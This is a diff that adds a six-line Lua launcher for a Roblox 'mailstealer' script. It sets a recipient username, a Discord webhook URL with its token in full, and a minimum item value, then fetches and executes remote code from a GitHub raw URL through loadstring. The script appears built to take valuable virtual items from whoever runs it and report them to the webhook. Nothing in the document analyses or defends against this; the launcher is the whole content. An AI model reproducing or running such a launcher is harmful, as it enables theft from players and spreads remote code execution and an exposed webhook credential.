@@ -1,0 +1,6 @@
+Username = "NOGABoga172"
+Username2 = "NOGABoga172" 
+Webhook = "https://discord.com/api/webhooks/1250829720619323394/F3BDz35g8nvT-qxr-4V0qm_ufsmotJhmHJOAalkD10AN7kyChoml3b5Hhw6__aqbWGQw"
+min_rap = 10000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HubScript/mailstealer/main/spacemail.lua"))()
